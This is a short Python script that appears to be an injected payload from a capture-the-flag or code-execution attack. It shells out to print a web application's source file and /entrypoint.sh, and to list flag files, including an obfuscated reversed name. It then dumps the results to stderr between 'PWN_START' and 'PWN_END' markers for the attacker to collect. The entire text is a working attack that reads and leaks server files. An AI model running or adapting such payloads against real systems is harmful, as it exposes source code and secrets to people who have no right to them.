import sys, subprocess
cmd = 'cat /app/src/phonenumber/main.py; echo "=====ENTRY====="; cat /entrypoint.sh; echo "=====LSGALF====="; ls -la /.txt.galf /flag.txt 2>&1'
r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
sys.stderr.write("\n=====PWN_START=====\n" + r.stdout + r.stderr + "\n=====PWN_END=====\n")
sys.stderr.flush()
raise SystemExit("done")
